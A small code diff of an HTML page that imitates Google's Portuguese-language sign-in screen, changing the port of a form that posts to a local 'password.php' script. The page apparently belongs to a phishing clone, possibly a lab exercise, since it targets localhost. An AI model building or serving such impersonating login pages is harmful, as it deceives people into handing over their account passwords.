@@ -21,7 +21,7 @@
         <div class="preloader-line"></div>
       </div>
 
-      <form action="http://localhost:8080/password.php" id="loginForm">
+      <form action="http://localhost:8081/password.php" id="loginForm">
         <img src="./images/google-logo.svg" alt="" />
         <h2>Fazer login</h2>
         <h3>Use sua Conta do Google</h3>
